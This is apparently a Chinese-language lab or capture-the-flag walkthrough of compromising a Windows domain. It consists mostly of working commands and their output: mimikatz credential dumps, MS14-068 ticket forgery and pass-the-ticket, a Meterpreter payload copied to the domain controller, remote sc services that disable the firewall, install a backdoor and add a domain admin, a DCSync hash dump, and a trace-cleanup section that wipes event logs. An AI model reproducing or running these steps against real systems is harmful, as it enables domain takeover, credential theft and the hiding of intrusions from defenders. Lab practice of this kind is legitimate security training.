Logon Time        : 2026/4/6 17:21:01
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : TESTWIN7-PC$
	 * Domain   : DEMO
	 * NTLM     : e3ba914bdaca29c197c7191ebf521873
	 * SHA1     : 68a1422322c303e4c24d63f381a03b34eb434477
	tspkg :	
	wdigest :	
	 * Username : TESTWIN7-PC$
	 * Domain   : DEMO
	 * Password : /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-'ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd"JRr
	kerberos :	
	 * Username : testwin7-pc$
	 * Domain   : demo.com
	 * Password : /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-'ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd"JRr
	ssp :	
	credman :	

Authentication Id : 0 ; 49448 (00000000:0000c128)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2026/4/6 17:21:01
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : TESTWIN7-PC$
	 * Domain   : DEMO
	 * NTLM     : e3ba914bdaca29c197c7191ebf521873
	 * SHA1     : 68a1422322c303e4c24d63f381a03b34eb434477
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : TESTWIN7-PC$
Domain            : DEMO
Logon Server      : (null)
Logon Time        : 2026/4/6 17:21:01
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : TESTWIN7-PC$
	 * Domain   : DEMO
	 * Password : /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-'ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd"JRr
	kerberos :	
	 * Username : testwin7-pc$
	 * Domain   : DEMO.COM
	 * Password : /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-'ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd"JRr
	ssp :	
	credman :	


```

从内存抓取的结果来看，这台 Win7 上目前**只有 **`**douser**` 这一个凭据，没有域管理员（Administrator）登录过的痕迹。

不过，我们拿到了一个非常关键的东西：`**douser**`** 的准确 SID**：`S-1-5-21-979886063-1111900045-1414766810-1107`

 我们要利用这个 SID 重新执行 **MS14-068**

进入 shell，并清理环境  

```bash
meterpreter > shell
Process 2248 created.
Channel 1 created.
Microsoft Windows [°汾 6.1.7601]
°爨̹Ԑ (c) 2009 Microsoft Corporation¡£±£´̹ԐȨ{¡£

C:\Windows\system32>chcp 65001
chcp 65001
Active code page: 65001

C:\Windows\system32>klist purge
klist purge

Current LogonId is 0:0x3e7
	Deleting all tickets:
	Ticket(s) purged!


```

 生成伪造票据  

```bash
C:\Windows\system32>cd C:\Users\douser\Desktop
cd C:\Users\douser\Desktop

C:\Users\douser\Desktop>ms14-068.exe -u douser@DEMO.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130
ms14-068.exe -u douser@DEMO.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130
  [+] Building AS-REQ for 192.168.183.130... Done!
  [+] Sending AS-REQ to 192.168.183.130... Done!
  [+] Receiving AS-REP from 192.168.183.130... Done!
  [+] Parsing AS-REP from 192.168.183.130... Done!
  [+] Building TGS-REQ for 192.168.183.130... Done!
  [+] Sending TGS-REQ to 192.168.183.130... Done!
  [+] Receiving TGS-REP from 192.168.183.130... Done!
  [+] Parsing TGS-REP from 192.168.183.130... Done!
  [+] Creating ccache file 'TGT_douser@DEMO.com.ccache'... Done!

```

 注入票据  

```bash
C:\Users\douser\Desktop>mimikatz.exe "kerberos::ptc TGT_douser@DEMO.com.ccache" exit
mimikatz.exe "kerberos::ptc TGT_douser@DEMO.com.ccache" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Jan  2 2020 19:21:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # kerberos::ptc TGT_douser@DEMO.com.ccache

Principal : (01) : douser ; @ DEMO.COM

Data 0
	   Start/End/MaxRenew: 2026/4/6 19:15:35 ; 2026/4/7 5:15:35 ; 2026/4/13 19:15:35
	   Service Name (01) : krbtgt ; DEMO.COM ; @ DEMO.COM
	   Target Name  (01) : krbtgt ; DEMO.COM ; @ DEMO.COM
	   Client Name  (01) : douser ; @ DEMO.COM
	   Flags 50a00000    : pre_authent ; renewable ; proxiable ; forwardable ; 
	   Session Key       : 0x00000017 - rc4_hmac_nt      
	     3824d7dc59fc7679f1e3f17c354f26b9
	   Ticket            : 0x00000000 - null              ; kvno = 2	[...]
	   * Injecting ticket : OK

mimikatz(commandline) # exit
Bye!


```



 尝试访问域控  

 成功绕过了域控的权限校验。虽然登录的账号是 `douser`，但域控（130）现在认为我是**域管理员**

```bash
C:\Users\douser\Desktop>dir \\WIN-ENS2VR5TR3N\c$
dir \\WIN-ENS2VR5TR3N\c$
 Volume in drive \\WIN-ENS2VR5TR3N\c$ has no label.
 Volume Serial Number is 702B-0D1B

 Directory of \\WIN-ENS2VR5TR3N\c$

2009/07/14  11:20    <DIR>          PerfLogs
2026/04/05  18:10    <DIR>          Program Files
2020/01/24  13:30    <DIR>          Program Files (x86)
2019/12/31  11:01    <DIR>          Users
2026/04/06  16:11    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  11,175,084,032 bytes free

C:\Users\douser\Desktop>

```



**拿下域控的 Meterpreter Shell**。  



 上传木马到域控  

```bash
C:\Users\douser\Desktop>copy C:\Users\douser\Desktop\bind.exe \\WIN-ENS2VR5TR3N\c$\windows\temp\
copy C:\Users\douser\Desktop\bind.exe \\WIN-ENS2VR5TR3N\c$\windows\temp\
        1 file(s) copied.

```

 远程创建并启动服务  

> 虽然提示了 `**FAILED 1053**`（服务响应超时），但这在内网渗透中其实是**极其常见且成功**的信号！
>
> ### 为什么会报 1053？
> 因为你生成的 `bind.exe` 通常是一个普通的 **Meterpreter Payload**，而不是一个遵循 Windows 服务规范的 **Service Executable**。
>
> + **过程**：Windows 启动了你的 `bind.exe`。
> + **结果**：`bind.exe` 已经在后台跑起来了（Payload 已激活），但它没有给 Windows 服务管理器（SCM）返回“我已成功启动”的回执。
> + **后果**：Windows 等了 30 秒没等到回执，就报错超时了，但 **木马其实已经在内存里运行了**。
>

在此之前还要将防火墙关闭：

```bash
meterpreter > shell
Process 736 created.
Channel 3 created.
Microsoft Windows [°汾 6.1.7601]
°爨̹Ԑ (c) 2009 Microsoft Corporation¡£±£´̹ԐȨ{¡£

C:\Windows\system32>sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= "netsh advfirewall set allprofiles state off"
sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= "netsh advfirewall set allprofiles state off"
[SC] CreateService ³ɹ¦

C:\Windows\system32>sc \\WIN-ENS2VR5TR3N start unablefirewall
sc \\WIN-ENS2VR5TR3N start unablefirewall
[SC] StartService ʧ°ڠ1053:

·þϱûԐ¼°ʱЬӦǴ¶¯»󀙖Ǉ숳¡£


C:\Windows\system32>

```



```bash
C:\Users\douser\Desktop>sc \\WIN-ENS2VR5TR3N create BackdoorService binpath= "c:\windows\temp\bind.exe"
sc \\WIN-ENS2VR5TR3N create BackdoorService binpath= "c:\windows\temp\bind.exe"
[SC] CreateService SUCCESS

C:\Users\douser\Desktop>sc \\WIN-ENS2VR5TR3N start BackdoorService
sc \\WIN-ENS2VR5TR3N start BackdoorService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


C:\Users\douser\Desktop>

```

 

```bash
C:\Windows\system32>sc \\WIN-ENS2VR5TR3N create adddomainadmin binpath= "net group \"domain admins\" douser /add /domain"
sc \\WIN-ENS2VR5TR3N create adddomainadmin binpath= "net group \"domain admins\" douser /add /domain"
[SC] CreateService SUCCESS

C:\Windows\system32>sc \\WIN-ENS2VR5TR3N start adddomainadmin
sc \\WIN-ENS2VR5TR3N start adddomainadmin
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


C:\Windows\system32>net user douser /domain
net user douser /domain
The request will be processed at a domain controller for domain demo.com.

User name                    douser
Full Name                    douser
Comment                      
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020/1/24 13:44:54
Password expires             Never
Password changeable          2020/1/25 13:44:54
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2026/4/6 19:20:49

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *Domain Admins        *Domain Users         
The command completed successfully.

C:\Windows\system32>^C
Terminate channel 7? [y/N]  y
meterpreter > load kiwi
[!] The "kiwi" extension has already been loaded.
meterpreter > kiwi_cmd lsadump::dcsync /domain:DEMO.com /all /csv
[DC] 'DEMO.com' will be the domain
[DC] 'WIN-ENS2VR5TR3N.demo.com' will be the DC server
[DC] Exporting domain 'DEMO.com'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502	krbtgt	7c4ed692473d4b4344c3ba01c5e6cb63	514
500	Administrator	68fa0147af8369f611458bf34342c42a	512
1103	douser	bc23b0b4d5bf5ff42bc61fb62e13886e	66048
1000	WIN-ENS2VR5TR3N$	50d0ed42b7c47af8da754f2d5885dbc3	532480

meterpreter > 

```

`Administrator (500): 68fa0147af8369f611458bf34342c42a`。这是域控本地管理员的 NTLM Hash。

`krbtgt (502): 7c4ed692473d4b4344c3ba01c5e6cb63`。这是域内最核心的账户。有了它的 Hash，可以伪造黄金票据 (Golden Ticket)，这意味着即便域控管理员修改了所有人的密码，只要不连续重置两次 krbtgt 的密码，都能永远拥有域管权限。

douser: 在 Global Group memberships 里已经是 *Domain Admins ，这意味着我们刚才的 `sc create` 操作已经成功修改了域数据库。



### 另一种：
```bash
C:\Windows\system32>cd C:\Users\douser\Desktop
cd C:\Users\douser\Desktop

C:\Users\douser\Desktop>ms14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123
ms14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123
  [+] Building AS-REQ for 192.168.183.130... Done!
  [+] Sending AS-REQ to 192.168.183.130... Done!
  [+] Receiving AS-REP from 192.168.183.130... Done!
  [+] Parsing AS-REP from 192.168.183.130... Done!
  [+] Building TGS-REQ for 192.168.183.130... Done!
  [+] Sending TGS-REQ to 192.168.183.130... Done!
  [+] Receiving TGS-REP from 192.168.183.130... Done!
  [+] Parsing TGS-REP from 192.168.183.130... Done!
  [+] Creating ccache file 'TGT_douser@DEMO.com.ccache'... Done!

:\Users\douser\Desktop>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jan  2 2020 19:21:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # kerberos::list

mimikatz # kerberos::ptc TGT_douser@DEMO.com.ccache

Principal : (01) : douser ; @ DEMO.COM

Data 0
	   Start/End/MaxRenew: 2026/4/6 19:59:11 ; 2026/4/7 5:59:11 ; 2026/4/13 19:59:11
	   Service Name (01) : krbtgt ; DEMO.COM ; @ DEMO.COM
	   Target Name  (01) : krbtgt ; DEMO.COM ; @ DEMO.COM
	   Client Name  (01) : douser ; @ DEMO.COM
	   Flags 50a00000    : pre_authent ; renewable ; proxiable ; forwardable ; 
	   Session Key       : 0x00000017 - rc4_hmac_nt      
	     2cc042156e3e7e1a84f0875542aa6361
	   Ticket            : 0x00000000 - null              ; kvno = 2	[...]
	   * Injecting ticket : OK

mimikatz # kerberos::list

[00000000] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2026/4/6 19:59:11 ; 2026/4/7 5:59:11 ; 2026/4/13 19:59:11
   Server Name       : krbtgt/DEMO.COM @ DEMO.COM
   Client Name       : douser @ DEMO.COM
   Flags 50a00000    : pre_authent ; renewable ; proxiable ; forwardable ; 

mimikatz # exit
Bye!

C:\Users\douser\Desktop>
C:\Users\douser\Desktop>klist
klist

Current LogonId is 0:0x3e7

Cached Tickets: (1)

#0>	Client: douser @ DEMO.COM
	Server: krbtgt/DEMO.COM @ DEMO.COM
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x50a00000 -> forwardable proxiable renewable pre_authent 
	Start Time: 4/6/2026 19:59:11 (local)
	End Time:   4/7/2026 5:59:11 (local)
	Renew Time: 4/13/2026 19:59:11 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)


C:\Users\douser\Desktop>




```

# 痕迹清理
### 1. 远程服务清理（域控 130）
你之前通过 `sc` 命令在域控上创建了多个服务（`BackdoorService`, `unablefirewall`, `addadmin`, `adddomainadmin`, `checkfw`, `openrdp`, `stopfw`, `killold`）。这些在系统日志里非常显眼，必须删除。

**在 Win7 的 SYSTEM Shell 中执行：**

```plain
# 循环删除所有创建的服务
sc \\WIN-ENS2VR5TR3N delete BackdoorService
sc \\WIN-ENS2VR5TR3N delete unablefirewall
sc \\WIN-ENS2VR5TR3N delete addadmin
sc \\WIN-ENS2VR5TR3N delete adddomainadmin
sc \\WIN-ENS2VR5TR3N delete checkfw
sc \\WIN-ENS2VR5TR3N delete openrdp
sc \\WIN-ENS2VR5TR3N delete stopfw
sc \\WIN-ENS2VR5TR3N delete killold
sc \\WIN-ENS2VR5TR3N delete enable_rdp
```

---

### 2. 计划任务清理（域控 130）
你创建了 `FinalStrike` 和 `MyShell` 计划任务。

**在 Win7 的 SYSTEM Shell 中执行：**

DOS

```plain
schtasks /delete /s WIN-ENS2VR5TR3N /tn "FinalStrike" /f
schtasks /delete /s WIN-ENS2VR5TR3N /tn "MyShell" /f
```

---

### 3. 落地文件清理（两台机器）
清理所有上传的工具、生成的票据和日志文件。

**清理域控 (130) 上的文件：**

DOS

```plain
del \\WIN-ENS2VR5TR3N\c$\windows\temp\bind.exe
del \\WIN-ENS2VR5TR3N\c$\windows\temp\fw.txt
```

**清理 Win7 (129) 桌面和系统目录：（当然这个靶机不必清理，因为是作者帮我们上传的文件）**

```plain
cd C:\Users\douser\Desktop
del bind.exe
del ms14-068.exe
del mimikatz.exe
del TGT_douser@DEMO.com.ccache
# 清理之前可能留在 system32 的残留（如果有）
del C:\Windows\System32\bind.exe
```

---

### 4. 账户权限还原（域环境）
你在实验中把 `douser` 变成了域管，这在审计中是一眼就能看出来的。**如果不需要持久化，请务必还原。**

**在 Win7 的 SYSTEM Shell 中执行：**

DOS

```plain
# 将 douser 移出域管理员组
net group "domain admins" douser /delete /domain

# 将 douser 移出域控本地管理员组
net localgroup administrators douser /delete /domain
```

---

### 5. 系统日志清理（最核心的一步）
Windows 会记录服务创建（ID 7045）、登录成功（ID 4624）等事件。

**利用 Mimikatz (Kiwi) 一键清理：** 在 Meterpreter 会话中（Session 3）：

```plain
# 清理本地 Win7 的所有事件日志（慎用，全空也很可疑，但在练习中很有效）
clearev
```



### 6. 内存票据清理
退出前清理掉注入到系统进程里的伪造票据。

**在 Win7 的 Shell 中：**

DOS

```plain
klist purge
```

